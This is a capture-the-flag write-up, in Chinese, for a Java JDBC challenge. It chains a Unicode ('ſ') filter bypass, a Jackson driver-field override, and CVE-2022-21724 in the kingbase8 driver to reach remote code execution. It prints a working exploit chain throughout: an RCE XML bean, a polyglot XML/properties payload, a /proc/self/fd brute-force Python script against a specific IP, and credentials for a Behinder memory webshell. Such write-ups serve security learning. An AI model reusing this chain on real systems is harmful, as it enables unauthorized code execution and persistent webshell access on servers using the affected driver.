

# SU_jdbc-master

## 题目描述

由实战改编 证明你是jdbc大师的时候到了(PS：请本地打通再测试线上)

Adapted from real-world practice, it's time to prove you're a JDBC master!(P.S.: Please test locally before testing online.)

## 环境搭建

```
docker build -t jdbc-master .
docker-compose up
```

## 解题思路

访问 127.0.0.1:8080 可以看到欢迎界面，证明环境成功搭建

![QQ20260223-155156-23-1](./img/QQ20260223-155156-23-1.png)

分析源码可以发现，`/api/connection` 接口有一个可以测试 jdbc 连接的功能：

![QQ20260223-155602-23-2](./img/QQ20260223-155602-23-2.png)

但直接测试接口会发现我们的请求被拦截了：

![QQ20260223-155711-23-3](./img/QQ20260223-155711-23-3.png)

回到源码，可以发现 `suctf` 这个接口被限制了不可访问：

![QQ20260223-155826-23-4](./img/QQ20260223-155826-23-4.png)

```
HttpServletRequest r = request;
HttpServletResponse res = response;
String servletPath = r.getServletPath();

if (servletPath != null && (
                servletPath.matches("(?i).*s\\W*u\\W*c\\W*t\\W*f.*")
                        || servletPath.toLowerCase().contains("suctf")
                        || servletPath.toLowerCase().replaceAll("[^a-z0-9]", "").contains("suctf")
        )) {
            res.setStatus(HttpServletResponse.SC_FORBIDDEN);
            res.getWriter().write("blocked by filter");
            return false;
        }
```

可以看到这里的限制逻辑是获取 `getServletPath`，先用大小写不敏感的正则表达式过滤 `suctf`，然后把 `ServletPath` 转小写之后和 `suctf`对比，确保访问的 url 不含这几个关键字。分析 WebConfig 可以发现路由匹配这里被设置了大小写不敏感：

![QQ20260223-160112-23-5](./img/QQ20260223-160112-23-5.png)

当 Spring 底层被设置大小写不敏感之后，路由匹配走的逻辑是 `this.rawPattern.equalsIgnoreCase(str)` ：

![QQ20260223-160716-23-6](./img/QQ20260223-160716-23-6.png)

`equalsIgnoreCase` 的匹配逻辑是逐字符利用 `regionMatches`做匹配：

![QQ20260223-161130-23-7](./img/QQ20260223-161130-23-7.png)

这里有一个很有趣的点，java 官方也意识到某些特殊字符在大小写的转换上会有差异，所以这里的选择是：**在字符匹配上，不要求同时满足两个字符大写和小写均相同，而是只要大写或者小写相同即可满足匹配**：

![QQ20260223-161308-23-8](./img/QQ20260223-161308-23-8.png)

在 java 里存在一些特殊的 unicode 字符，大小写转换的时候会出现差异，比如字符”ı”转大写之后会变成”I”，字符”ſ”转换大写之后会变成”S"

```
package JDBC;

public class upper {
    public static void main(String[] args) {
        String var1 = "ı";
        String var2 = "ſ";
        System.out.println(var1.toUpperCase().equals("I"));
        System.out.println(var2.toUpperCase().equals("S"));
    }
}
```

![2025_05_QQ20250502-225850-23-9](./img/2025_05_QQ20250502-225850-23-9.png)

这里我们就能明白，其实之前转小写的检查在这里是无效的，因为我们的特殊字符”ſ”转换大写之后会变成”S"通过路由匹配逻辑，而转小写的时候它和"s"无关，所以能够绕过检测。

但还有一个问题就是这里还有一个大小写不敏感的正则匹配逻辑，我们的特殊 unicode 字符能绕过它吗？其实是可以的，我们看到 java 里正则匹配的底层逻辑，只有在带 UNICODE_CASE（例如 (?u)）时，才会用 Character，此时走的是标准的 `Character.toLowerCase/toUpperCase`：

![QQ20260223-170829-23-9](./img/QQ20260223-170829-23-9.png)

而我们这里写的匹配里没有这个，所以默认走的是 ascii 模式，它的实现其实是“只动 A–Z”，其它原样返回，由于我们的特殊字符根本就不在标准字母之内，直接就被跳过了，所以也能绕过该大小写不敏感的匹配：

![QQ20260223-171114-23-11](./img/QQ20260223-171114-23-11.png)

所以现在我们就明白，绕过匹配的核心就是用 `ſuctf`代替 `suctf`，在最终路由匹配的时候`ſuctf`会被转大写，成功匹配上`suctf`，在发请求的时候需要编一下码：

```
POST /api/connection/%C5%BFuctf HTTP/1.1
Host: 127.0.0.1:8080
Content-Length: 120
sec-ch-ua: "Not(A:Brand";v="24", "Chromium";v="122"
sec-ch-ua-platform: "Windows"
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.57 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: http://127.0.0.1:8080
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://127.0.0.1:8080/api/connection
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: close

{"urlType":"jdbcUrl","jdbcUrl":"jdbc:postgresql://127.0.0.1:5432/test","username":"postgres","password":"your_password"}
```

![QQ20260223-171650-23-12](./img/QQ20260223-171650-23-12.png)

现在进入第二关，由于是postgresql，想必许多师傅已经情不自禁的开始尝试 CVE-2022-21724 了，但要注意，我这里给的 postgresql 驱动可是42.3.6的版本，早就过了漏洞的影响版本了，你当然是打不通的（事实上 dataease 的 postgresql 也是这个版本，所以根本没法利用 postgresql，我很好奇之前的人是怎么水到 dataease postgresql 绕过的 cve 的）

![QQ20260223-171815-23-13](./img/QQ20260223-171815-23-13.png)

虽然我在我博客上分享过高版本 postgresql jdbc RCE 的办法：[postgresql jdbc鸡肋RCE](https://fushuling.com/index.php/2026/01/27/postgresql-jdbc鸡肋rce/)，但这个东西利用限制还是比较高的，感觉实战能利用的概率很低，在我的预期设计里本题也不是用这个点

认真复现过CVE-2022-21724的师傅应该知道，CVE-2022-21724出现的根本原因是驱动程序在实例化类之前没有验证类是否实现了预期的接口，所以导致攻击者可以利用一些恶意的类来实现rce，我们看到官方的[补丁](https://github.com/pgjdbc/pgjdbc/commit/f4d0ed69c0b3aae8531d83d6af4c57f22312c813)，可以看到他们修复的逻辑就是添加了代码逻辑验证该类是否实现了预期的接口，而不是直接实例化传入的类名：

![QQ20250808-174555-23-14](./img/QQ20250808-174555-23-14.png)

我们这个项目里的postgresql便是如此，可以看到这里多了`SocketFactory.class`：

![QQ20250808-174845-23-15](./img/QQ20250808-174845-23-15.png)

难道出题人是让我们绕postgresql的补丁吗，出题人也太坏了！！！

![2025_05_nanbeng-23-16](./img/2025_05_nanbeng-23-16.png)

当然不是，要是真能绕我肯定早就拿去交了咋可能拿来出题，在drivers那里，除了postgresql-42.3.6.jar还有一个kingbase8-8.6.jar，虽然你在网上搜不到什么现成能打的nday，但能发现它是一个基于postgresql的国产引擎：

![QQ20250808-175426-23-17](./img/QQ20250808-175426-23-17.png)

我们同样看到它的`SocketFactoryFactory`的部分，可以看到它的这一部分基本上和postgresql一样，并且是没有`SocketFactory.class`的未修复版本，所以**我们仍然可以利用CVE-2022-21724**：

![QQ20250808-175547-23-18](./img/QQ20250808-175547-23-18.png)

现在还有一个问题，这个项目的默认jdbc逻辑是走postgresql的，不走kingbase8，我们该怎么实现连接呢？回到一开始，这个项目的jdbc连接由两部分组成，一是通过`configuration.getJdbc()`获取对应的jdbc url，二是通过`configuration.getDriver()`获取对应的驱动，`configuration.getJdbc()`这里还好，因为没有做校验，所以我们写`jdbc:kingbase8:`想必也能通过验证，但驱动这一块怎么办呢，`configuration.getDriver()`可直接返回的是`org.postgresql.Driver`：

![QQ20250808-175954-23-19](./img/QQ20250808-175954-23-19.png)

这里有一个比较不容易注意到的地方，我们传入的`configurationJson`是通过 `objectMapper.readValue`实例化对应的`Pg.class`的，而`objectMapper`来自于`com.fasterxml.jackson.databind.ObjectMapper`，所以这里走的其实是jackson的反序列化：

![QQ20250808-180157-23-20](./img/QQ20250808-180157-23-20.png)

这里有一个非常有趣的点，Jackson（以及其他大多数 JSON 反序列化框架）的工作方式是：

- 先创建对象实例（会执行默认值初始化）。
- 再根据 JSON 中的字段进行赋值。
- 如果 JSON 中有某个字段，它会覆盖对象的默认值。
- 如果 JSON 中没有某个字段，则对象的该字段会保留默认值。

也就是说：**我们其实可以主动指定 driver 的值来覆盖默认的 driver 的值 org.postgresql.Driver**

这里我们本地可以做个小实验：

```
package JDBC;

import com.fasterxml.jackson.core.JsonProcessingException;
import com.fasterxml.jackson.databind.ObjectMapper;

public class parse {
    private static final ObjectMapper objectMapper;

    static {
        objectMapper = new ObjectMapper();
    }

    public static <T> T parseObject(String json, Class<T> classOfT) {
        if (json == null) return null;
        T t = null;
        try {
            t = objectMapper.readValue(json, classOfT);
        } catch (JsonProcessingException e) {
            e.printStackTrace();
        }
        return t;
    }

    public static void main(String[] args) {
        H2 h2 = parseObject("{\"driver\":\"org.h2.Driver\"}",H2.class);
        System.out.println(h2.getDriver());
    }
}

class H2 {
    private String driver = "oracle.jdbc.driver.OracleDriver";
    public String getDriver() {
        return driver;
    }
}
```

![img](./img/2025_06_QQ20250628-232341-28-9.png)

可以看到，我们主动传入 `org.h2.Driver` 成功覆盖了默认的 `oracle.jdbc.driver.OracleDriver`。因此现在的思路就比较明显了，我们只需要传入kingbase8对应的jdbc url，再指定driver的值为 `com.kingbase8.Driver`，那么返回的就会是kingbase8的jdbc url，指定的jdbc引擎也会是kingbase8对应的引擎，按照kingbase8的逻辑实现jdbc连接。

但是当我们兴冲冲的想直接利用 `CVE-2022-21724`的时候可以发现还是不行，怎么还有奇怪的黑名单：

![QQ20260223-173058-23-22](./img/QQ20260223-173058-23-22.png)

![QQ20260223-173016-23-21](./img/QQ20260223-173016-23-21.png)

常见的参数全被 ban 了，而无论是 kingbase8 还是 postgresql，在键的解析上都没有什么特性，必须精确匹配，虽然在值上走了一次解码，但放在我们这个场景也没什么用，主要是参数被 ban 了。

再看到 kingbase8 的源码，首先 `:/`的绕过比较简单，无论是 postgresql 还是 kingbase8 都有一个特性，就是可以忽略 `ip` 和 `/`，如果没有 ip 和 port，驱动会补一个默认的，所以 url 可以这么写：

```
jdbc:kingbase8:?a=1
```

![QQ20260223-173607-23-23](./img/QQ20260223-173607-23-23.png)

接着往下分析有一个很有意思的点，就是kingbase8 其实可以通过配置文件来进行属性实例化：

![QQ20260223-174108-23-24](./img/QQ20260223-174108-23-24.png)

具体而言，这个参数是 `ConfigurePath`，所以一个自然而然的思路就是通过这个配置文件来利用 CVE-2022-21724，在配置文件里设置 `socketFactory` 和 `socketFactoryArg`

![QQ20260223-174239-23-25](./img/QQ20260223-174239-23-25.png)

我们本地可以尝试一下，先写一个配置文件 evil.txt：

```
socketFactory=org.springframework.context.support.FileSystemXmlApplicationContext
socketFactoryArg=http://127.0.0.1:50025/exp.xml
```

然后写一个 exp.xml，然后用 python -m http.server 50025 启动web 服务

```
<beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xsi:schemaLocation="http://www.springframework.org/schema/beans
       http://www.springframework.org/schema/beans/spring-beans.xsd">

    <bean id="calc" class="java.lang.ProcessBuilder" init-method="start">
        <constructor-arg>
            <list>
                <value>cmd</value>
                <value>/c</value>
                <value>calc</value>
            </list>
        </constructor-arg>
    </bean>

</beans>
```

```
package JDBC;

import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.SQLException;

public class kingbaseRCE {
    public static void main(String[] args) throws SQLException {
        String url ="jdbc:kingbase8:?ConfigurePath=/D:/test/evil.txt";
        Connection conn = DriverManager.getConnection(url, "", "");
    }
}

```

![QQ20260223-174859-23-26](./img/QQ20260223-174859-23-26.png)

看起来我们离成功很近了，实则还有很远，首先这个配置文件不能用远程地址，只能是本地路径，其次题目是不出网的

提到 jdbc 且需要临时文件，大家能想起来的应该是 m4x 哥哥的一篇文章：[从JDBC MySQL不出网攻击到spring临时文件利用](https://xz.aliyun.com/news/17830)，这里给出的思路是用 spring 的临时文件配合 linux fd 进行利用，以及p神的 postgresql 不出网挑战：[ClassPathXmlApplicationContext的不出网利用](https://www.leavesongs.com/PENETRATION/springboot-xml-beans-exploit-without-network.html)

想要成功完成不出网利用需要同时利用上面两篇文章，也需要两次临时文件，首先 kingbase8 的配置文件就需要一个临时文件，其次，利用 `CVE-2022-21724`也需要临时文件，因为必须通过 xml 不出网的触发 rce。单纯的利用 fd 是不可能完成的，因为如果配置文件里指向 xml 的临时文件也用的 fd，爆破空间也太大了，爆配置文件需要 fd，爆配置文件里指向 xml 的地址也需要 fd，太难实现了

但当我们看到p神的博客，可以发现其实 `socketFactoryArg`指向的地址是可以用通配符的，所以配置文件里指向 xml 的地址其实可以精确指定到临时文件那个目录，根本不需要爆破：

![QQ20260223-175906-23-27](./img/QQ20260223-175906-23-27.png)

现在的思路就很明显了，需要两次临时文件，第一个临时文件是kingbase8的配置文件，第二个临时文件是触发RCE所需的xml，第一个临时文件用 fd 爆破，然后在配置文件里通过通配符指向 xml 对应的临时文件，这样即可通过一次爆破实现利用

但当我们兴冲冲的这么利用的时候，会发现一个很奇怪的报错：

![QQ20260223-180731-23-28](./img/QQ20260223-180731-23-28.png)

这是因为当我们在 `socketFactoryArg`利用通配符指向某个目录时，它会默认对该目录的所有文件都按照 xml 进行解析，只要有一个文件不符合 xml 格式就会报错，而我们的那个配置文件不符合 xml 格式，所以报错了。

我们再回到 kingbase8 解析配置文件的逻辑，这里用的是 JDK 自带的 `Properties.load(InputStream)`，需要的是标准的 Java Properties 文件格式，也就是纯文本的 key=value 形式，一行一条属性：

![QQ20260223-181217-23-29](./img/QQ20260223-181217-23-29.png)

而标准的 Java Properties 文件格式其实是一个非常宽松的格式，每一行里如果出现不符合格式键值对的格式会被跳过，只去解析符合格式的属性，所以我们其实可以将配置文件做一定的变形，让它即满足标准的 xml 格式，又满足 Java Properties 格式：

```
<?xml version="1.0" encoding="UTF-8"?>
<beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">

    <bean id="poc" class="java.lang.String">
        <constructor-arg value="
socketFactory=org.springframework.context.support.FileSystemXmlApplicationContext
socketFactoryArg=file:/${catalina.home}/**/*.tmp
        " />
    </bean>
</beans>
```

为了满足临时文件所需要的大体积，我们需要填充一些字符，这里我们需要在不影响 xml 格式的情况下引入，这里就用换行符即可，恶意xml这里由于是不出网，所以还需要打内存马，这里我们就使用 java-chain 来生成冰蝎马

![QQ20260315-210646-23-33](./img/QQ20260315-210646-23-33.png)

```
密码: LtgpWibaIA
请求路径: /*
请求头: Accept: yzhmcyzYChVRpdcX
脚本类型: JSP
```

![QQ20260315-211010-23-34](./img/QQ20260315-211010-23-34.png)

完整脚本如下：

```
import socket
import threading
import time
import requests
import json
from concurrent.futures import ThreadPoolExecutor, as_completed

HOST = "1.95.113.59"
PORT = 10020
URL = HOST + ":" + str(PORT)


import socket
import time


def cache_tmp(fileName):
    filepath = fileName
    with open(filepath, "rb") as f:
        raw_data = f.read().strip()
    data_hex = raw_data.hex()
    a = data_hex
    a = (
        b"""POST /api/connection HTTP/1.1
Host: """
        + URL.encode()
        + b"""
Accept-Encoding: gzip, deflate
Accept: */*
Content-Type: multipart/form-data; boundary=xxxxxx
User-Agent: python-requests/2.32.3
Content-Length: 1296800

--xxxxxx
Content-Disposition: form-data; name="file"; filename="a.txt"

{{payload}}
""".replace(
            b"\n", b"\r\n"
        ).replace(
            b"{{payload}}", bytes.fromhex(a) + b"\n" * 1024 * 124
        )
    )
    s = socket.socket()
    s.connect((HOST, PORT))
    s.sendall(a)
    time.sleep(1111111)


def exp():
    url = f"http://{HOST}:{PORT}/api/connection/%C5%BFuctf"
    headers = {
        "Host": URL,
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:145.0) Gecko/20100101 Firefox/145.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
        "X-Authorization": "cat /f*",
        "Content-Type": "application/json",
    }

    def send_request(fd):
        print(f"当前爆破到fd: {fd}")
        named_pipe_path = f"/proc/self/fd/{fd}"
        payload = {
            "urlType": "jdbcUrl",
            "driver": "com.kingbase8.Driver",
            "jdbcUrl": f"jdbc:kingbase8:?ConfigurePath={named_pipe_path}",
            "username": "postgres",
            "password": "your_password",
        }
        payload_json = json.dumps(payload).encode("utf-8")
        headers["Content-Length"] = str(len(payload_json))
        try:
            print(f"[exp] POST with fd={fd}")
            with requests.Session() as sess:
                r = sess.post(url, headers=headers, data=payload_json, timeout=5)
            print(r.text)
            time.sleep(2)
            return f"[exp] fd={fd} -> {r.status_code} len={len(r.content or b'')}"
        except Exception as e:
            return f"[exp] fd={fd} -> exception: {e}"

    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = {executor.submit(send_request, fd): fd for fd in range(21, 50)}
        for future in as_completed(futures):
            print(future.result())


t1 = threading.Thread(target=cache_tmp, args=("./evil.txt",))
t1.start()
time.sleep(1)
t2 = threading.Thread(target=cache_tmp, args=("./exp.xml",))
t2.start()
time.sleep(1)
exp()

```

我自己的脚本还是蛮稳定的，并发爆破能很快触发内存马加载最后连接冰蝎

![QQ20260315-210052-23-32](./img/QQ20260315-210052-23-32.png)

PS：上面的每一步真的都是由实战改编出来的，恭喜做出来这道题的师傅，你们已经是 JDBC 大师了！
